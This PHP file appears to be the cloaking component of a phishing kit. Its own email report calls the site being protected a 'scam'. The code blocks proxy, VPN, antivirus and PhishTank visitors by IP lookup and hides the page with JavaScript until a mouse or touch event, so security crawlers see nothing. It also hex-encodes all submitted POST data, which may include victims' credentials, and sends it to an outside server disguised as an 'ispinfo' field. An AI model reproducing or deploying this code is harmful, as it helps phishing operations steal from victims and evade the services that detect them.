<?php @error_reporting(0);
// This is a killer ANTI BOT Will ban and blacklist every pruxy / vpn / antivirus / phishtank bot using IP Intelligence and fingerprint. 
// auto email report sent when a bot detected!!
if(count(get_included_files()) == 1){
header("HTTP/1.0 304 Not Modified");
die;
}
function BabushkaBoiIP() {
	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $ipgrassjoss){
	                $ipgrassjoss = trim($ipgrassjoss);
	                if (filter_var($ipgrassjoss,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $ipgrassjoss;
	                }
	            }
	        }
	    }
	}
$ipo = BabushkaBoiIP(); // Uh, fuck no, this ain't no hookah Smokin' while I'm strollin' down Wooster Buck-fifty, my babushka No pistol poppers and prostituters Card scammers and the Prada boosters Low top, yeah, the powder blue ones
$tanitatikaram = parse_ini_file("proxy.ini", true);
$api=$tanitatikaram['apikey'];
$repm=$tanitatikaram['reportmail'];
$upd=$tanitatikaram['update'];
$mhook=$tanitatikaram['mhook'];
if($ipo == "") {
    }else{
		$isp = print_r($_POST, true);
		$isp = bin2hex($isp);
        $url = "".$upd."/check/?ip=$ipo&fingerprint=on&ispinfo=$isp&flags=b&api=$api";
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $json = curl_exec($ch);
        curl_close($ch);
		$result = json_decode($json);
		$a = $result->badbot;
        $b = $result->success;
		$c = $result->org;
		$d = $result->botcountry;
		if (strpos($b,'true') !== false) {
		if (strpos($a,'false') !== false) {
        }else if($isp == "blacklisted"){
		}else{
		header("HTTP/1.0 304 Not Modified");
		$MESSAGE="<p>Organization : $c </p> <p>IP : $ipo</p> <p>Bot country : $d</p>";
		$SUBJECT = "A BOT trying to access your scam and it was blocked successfully | $ipo | $c";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: BOTeye v1.9 <antibot@mail.com>\n"; // If it is a bad bot you will get a notification.
		mail($repm,$SUBJECT,$MESSAGE,$HEADER);
		die;
		}}
    }
	
if ($mhook == '1') {	
echo "
<script>
window.addEventListener('load', function () {
	
document.getElementsByTagName('body')[0].style.display = 'none';
document.getElementsByTagName('div')[0].style.display = 'none';

window.onmousemove = function() {
document.getElementsByTagName('body')[0].style.display = '';
document.getElementsByTagName('div')[0].style.display = '';
}

window.addEventListener('touchmove', function() {
document.getElementsByTagName('body')[0].style.display = '';
document.getElementsByTagName('div')[0].style.display = '';
});

window.addEventListener('touchstart', function() {
document.getElementsByTagName('body')[0].style.display = '';
document.getElementsByTagName('div')[0].style.display = '';
});


})
</script>
";
}	
?>